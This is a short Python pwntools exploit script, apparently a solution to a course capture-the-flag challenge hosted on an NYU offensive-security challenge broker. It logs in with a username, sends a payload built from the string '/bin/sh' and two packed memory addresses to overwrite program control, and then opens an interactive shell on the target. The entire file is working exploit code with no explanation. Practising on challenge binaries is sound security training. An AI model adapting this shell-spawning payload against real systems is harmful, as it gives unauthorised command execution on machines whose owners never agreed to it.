import sys
from pwn import *

c = p64(0x601010)
b = p64(0x4005d0)
command = "/bin/sh\x00"

REMOTE = True

bridge = ELF(sys.argv[1])
if REMOTE:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1341)
    p.recvuntil(":")
    p.sendline("joe215")
else:
    p = process(sys.argv[1])

print(p.recvuntil("save:"))
pwnQuery = command + b + c
print(pwnQuery)
p.sendline(pwnQuery)
p.interactive()
